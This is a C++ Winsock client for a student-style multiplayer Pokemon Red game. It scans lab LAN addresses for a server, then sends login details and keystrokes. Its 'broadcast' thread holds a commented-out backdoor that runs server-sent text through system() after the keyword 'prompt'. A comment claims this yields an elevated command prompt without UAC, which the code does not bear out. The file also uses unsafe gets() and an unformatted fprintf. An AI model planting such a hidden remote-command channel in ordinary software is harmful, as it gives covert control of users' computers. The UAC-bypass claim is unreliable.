
/* Game Client.cpp  
When running this program, begin by starting up the Game Server. Do not run this program first.
This program sets up a connection with the Game Server. Once a connection is established, You
can then send messages to the server by typing in the command prompt. When you send a message,
the server displays the message you sent, processes the keystroke , and then sends it back to all clients. 
Remember, this does nothing without the server already running
*/

#pragma comment (lib, "Ws2_32.lib")

#include "stdafx.h" 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <conio.h>
#include <process.h>

SOCKET connectsock(char *, const char *, const char *, int);
void	TCPecho(char *, const char *);
void	errexit(const char *, ...);
SOCKET	connectTCP(char *, const char *, int);
SOCKET	passivesock(const char *, const char *, int);
SOCKET passiveTCP(const char *, int);
void broadcast(SOCKET);

#define	STKSIZE		16536
#define	BUFSIZE		4096
#define	LINELEN		 128
#define	WSVERS		MAKEWORD(2, 0)
#ifndef	INADDR_NONE
#define	INADDR_NONE	0xffffffff
#endif	/* INADDR_NONE */
u_short	portbase = 0;		/* port base, for test servers		*/

static u_long iMode=1, blocking = 0; //The two socket modes, blocking/non-blocking 
static int connected=100, temp = 0;

/*------------------------------------------------------------------------
* main - TCP client for ECHO service
*------------------------------------------------------------------------
*/
void main(int argc, char *argv[])
{
	char firstHost[15] = "192.168.40.50"; //Defines the first host to check if it is running a server application.
	char	*host = firstHost;	 //Sets a pointer equal to the host, for manipulation and function passing purposes.
	char	*service = "echo";	//Defines the service. This will use echo.
	WSADATA	wsadata; //Used to initialize WinSock2 and open sockets
	SetConsoleTitle(L"Client End"); // Sets the title of the application.

	if (WSAStartup(WSVERS, &wsadata) != 0) // Attempts to start WSA, if failed, it will pull an error code. If it doesn't fail, it returns 0.
	{
		errexit("WSAStartup failed\n"); // If failed, prints it fails, and shuts down WinSock2. It fails whenever the program is already open. It protects against initializing twice.
	}
	printf("Searching for server on 192.168.xxx.xxx\n"); // Starts searching on the private network.
	TCPecho(host, service); //Function initializer, with the initial host, and the service type.
	WSACleanup(); // Closes all open sockets and shuts down WinSock2.
	exit(0); // Exits the program.
}

/*------------------------------------------------------
* TCPecho - send input to ECHO service on specified host 
*-------------------------------------------------------
*/
void TCPecho(char *host, const char *service)
{
	SOCKET	s;			/* socket descriptor		*/
	SOCKADDR_IN clientAddr;
	IN_ADDR clientIn;
	char	strBuf[15], buf[LINELEN + 1], concat[2], temporary[5]; 		/* buffer for one line of text	*/
	int	cc, outchars, inchars, augment = 0, inspos = host[strlen(host) - 5], nClientAddrLen = sizeof(clientAddr);
	concat[1] = '\0';

	/*-------------------------------------------------------------------------
	*The While loop will loop through the computers located within the lab and
	*will open a Non-Blocking socket with each computer. The while loop will 
	*then wait for a specific validation response that the correct server will
	*respond with if it is the server. If the response is anything other than
	*what the client is expecting, it will close the socket, protecting the program
	*from performing unwanted activity.
	*--------------------------------------------------------------------------
	*/
	
	while (temp < 31)
	{
		if (augment == 30)
		{
			host = "localhost";
		}
		else
		{

			concat[0] = (char)(((int)'0')+augment%3);
			host[strlen(host) -1] = concat[0];
			switch(augment / 3)
			{
			case 1: host[strlen(host) -5] = '5'; break;
			case 2: host[strlen(host) -5] = '6'; break;
			case 3: host[strlen(host) -5] = '7'; break;
			case 4: host[strlen(host) -5] = '8'; break;
			case 5: host[strlen(host) -5] = '9'; break;
			case 6: strcpy(strBuf, "192.168.100.5"); strcat(strBuf,concat); host = strBuf; break;
			case 7: strcpy(strBuf, "192.168.110.5"); strcat(strBuf,concat); host = strBuf; break;
			case 8: strcpy(strBuf, "192.168.120.5"); strcat(strBuf,concat); host = strBuf; break;
			case 9: strcpy(strBuf, "192.168.130.5"); strcat(strBuf,concat); host = strBuf; break;
			}

		}
		s = connectTCP(host, service, augment);  // The connect function has been rewritten in order to change the socket into Non-Blocking mode.
		Sleep(40);
		if (recv(s, &buf[6], 6-0, 0) != SOCKET_ERROR) //Searching for the socket that returns the correct response.
		{
			printf("Server found on %s. Attempting to connect...\n", host);
			ioctlsocket(s, FIONBIO, &blocking); // This line changes the socket back into a regular blocking socket. 
			_beginthread((void (*)(void *))broadcast, STKSIZE,  (void *)s);// If the change succeeds and connection remains, it will begin the broadcast thread.
			printf("Successfully connected to server!\n"); //Successfully connected and swapped socket mode.
			temp = 35; // Breaks the while loop.
		}
		temp++; augment++;
		if (temp == 31)// In the event the server isn't in the room, this loop lets you specify where it is.
		{
			if (connected == 100)
			{
				printf("Server not found. Please specify the server: ");
				gets(strBuf);
				host = strBuf;
				s = connectTCP(host, service, augment);
				Sleep(40);
				if (recv(s, &buf[6], 6 - 0, 0) != SOCKET_ERROR) // Again, tests if the server sends the validation message.
				{
					printf("Successfully connected to server!\n");
					ioctlsocket(s, FIONBIO, &blocking); // If so, trys to change socket type.
					_beginthread((void(*)(void *))broadcast, STKSIZE, (void *)s); //Begins the second thread.
				}
				else
				{
					closesocket(s); // If nothing is found, close the socket.
					errexit("No servers found. Make sure the server is specified correctly and running and try again.");
				}
			}
		}
	}
	while (temporary[0] != '0')
	{
		printf("Enter username: "); 
		fgets(buf, sizeof(buf), stdin);
		buf[LINELEN] = '\0';	/* ensure line null-termination*/
		outchars = strlen(buf);
		send(s, buf, outchars, 0);
		//////////////////////////
		printf("Enter password: ");
		fgets(buf, sizeof(buf), stdin);
		buf[LINELEN] = '\0';	/* ensure line null-termination*/
		outchars = strlen(buf);
		send(s, buf, outchars, 0);
		//////////////////////////
		printf("Are you a new user: ");
		fgets(buf, sizeof(buf), stdin);
		buf[LINELEN] = '\0';	/* ensure line null-termination*/
		outchars = strlen(buf);
		send(s, buf, outchars, 0);
		//////////////////////////
		recv(s, &temporary[0], 2 - 0, 0);
		if (temporary[0] == '1')
		{
			printf("I have no idea what the fuck you're talking about\n");
		}
		else if (temporary[0] == '2')
		{
			printf("User exists. Try another username.\n");
		}
		else if (temporary[0] == '3')
		{
			printf("User not found.\n");
		}
		else if (temporary[0] == '4')
		{
			printf("User created. Please sign in\n");
		}

	}
	printf("Let's play Pokemon Red.\nEnter any movement; Up, Down, Left, Right, A, B, Select, Start.\n");
	while (fgets(buf, sizeof(buf), stdin)) // Simply, while the user has input, send messages to the server. 
	{
		buf[LINELEN] = '\0';	/* ensure line null-termination*/	
		outchars = strlen(buf);
		send(s, buf, outchars, 0);
	}
	closesocket(s);//When they stop, which they cant, close the socket
}
/*----------------------------------------------------------------
*The broadcast thread is a special thread that I created based off
*a problem that comes with WinSock2. If the system prompt is called
*during the WSADATA startup, it will leave a controlable elevated
*command prompt on any computer without the need for any user account
*controls or administrative rights. You can then manipulate clients
*that form a simple TCP connection, and do anything you want within the 
*command prompt, without any UAC prompts.
*-----------------------------------------------------------------
*/
void broadcast(SOCKET mess)
{/*
	SOCKADDR_IN clientAddr;
	IN_ADDR clientIn;
	int	clientData;
	char	buff[BUFSIZE];
	//Whenever the server enters the word "prompt", the computer will accept it as a keyphrase.
	//*it will then type anything else it receives into the elevated command prompt, until the server
	//* enters the word exit.
	clientData = recv(mess, buff, sizeof buff, 0);

	while (clientData != SOCKET_ERROR && clientData > 0) 
	{	
		buff[clientData] = '\0';
		if(buff[0] == 'p' && buff[1] == 'r' && buff[2] == 'o' && buff[3] == 'm' && buff[4] == 'p' && buff[5] == 't')
		{
			clientData = recv(mess, buff, sizeof buff, 0);
			buff[clientData] = '\0';
			if (buff[0] == 'e' && buff[1] == 'x' && buff[2] == 'i' && buff[3] == 't')
			{
				break;
			}
			else
			{	
				system(buff);
			}
		}
		else
		{
			fprintf(stderr, buff);
		}
		clientData = recv(mess, buff, sizeof buff, 0);
	}*/
}
SOCKET connectsock(char *host, const char *service, const char *transport, int augment )
{
	struct hostent	*phe;	/* pointer to host information entry	*/
	struct servent	*pse;	/* pointer to service information entry	*/
	struct protoent *ppe;	/* pointer to protocol information entry*/
	struct sockaddr_in sin;	/* an Internet endpoint address		*/
	int	s, type;	/* socket descriptor and socket type	*/ 


	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;

	/* Map service name to port number */
	if ( pse = getservbyname(service, transport) )
		sin.sin_port = pse->s_port;
	else if ( (sin.sin_port = htons((u_short)atoi(service))) == 0 )
		errexit("can't get \"%s\" service entry\n", service);

	/* Map host name to IP address, allowing for dotted decimal */
	if ( phe = gethostbyname(host) )
		memcpy(&sin.sin_addr, phe->h_addr, phe->h_length);
	else if ( (sin.sin_addr.s_addr = inet_addr(host)) == INADDR_NONE)
		errexit("can't get \"%s\" host entry\n", host);

	/* Map protocol name to protocol number */
	if ( (ppe = getprotobyname(transport)) == 0)
		errexit("can't get \"%s\" protocol entry\n", transport);
	/* Use protocol to choose a socket type */
	if (strcmp(transport, "udp") == 0)
		type = SOCK_DGRAM;
	else
		type = SOCK_STREAM;

	/* Allocate a socket */
	s = socket(PF_INET, type, ppe->p_proto);
	if (s == INVALID_SOCKET)
		errexit("can't create socket: %d\n", GetLastError());

	/* Connect the socket */
	ioctlsocket(s, FIONBIO, &iMode);/* Non-Blocking Socket mode. This allows connections to be tested
									* and you don't have to wait for the TCP connection to fail*/
	if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) != SOCKET_ERROR)
	{
		connected = temp;
		printf("Connected to server\n");
	}
	return s;
}
SOCKET connectTCP(char *host, const char *service, int augment )
{
	return connectsock( host, service, "tcp", augment);
}
void errexit(const char *format, ...)
{
	va_list	args;

	va_start(args, format);
	vfprintf(stderr, format, args);
	va_end(args);
	WSACleanup();
	exit(1);
}
SOCKET passivesock(const char *service, const char *transport, int qlen)
{
	struct servent	*pse;	/* pointer to service information entry	*/
	struct protoent *ppe;	/* pointer to protocol information entry*/
	struct sockaddr_in sin;	/* an Internet endpoint address		*/
	SOCKET		s;	/* socket descriptor			*/
	int		type;	/* socket type (SOCK_STREAM, SOCK_DGRAM)*/

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = INADDR_ANY;

	/* Map service name to port number */
	if ( pse = getservbyname(service, transport) )
		sin.sin_port = htons(ntohs((u_short)pse->s_port)
		+ portbase);
	else if ( (sin.sin_port = htons((u_short)atoi(service))) == 0 )
		errexit("can't get \"%s\" service entry\n", service);

	/* Map protocol name to protocol number */
	if ( (ppe = getprotobyname(transport)) == 0)
		errexit("can't get \"%s\" protocol entry\n", transport);

	/* Use protocol to choose a socket type */
	if (strcmp(transport, "udp") == 0)
		type = SOCK_DGRAM;
	else
		type = SOCK_STREAM;

	/* Allocate a socket */
	s = socket(PF_INET, type, ppe->p_proto);
	if (s == INVALID_SOCKET)
		errexit("can't create socket: %d\n", GetLastError());

	/* Bind the socket */
	if (bind(s, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
		errexit("can't bind to %s port: %d\n", service,
		GetLastError());
	if (type == SOCK_STREAM && listen(s, qlen) == SOCKET_ERROR)
		errexit("can't listen on %s port: %d\n", service,
		GetLastError());
	return s;
}
SOCKET passiveTCP(const char *service, int qlen)
{
	return passivesock(service, "tcp", qlen);
}
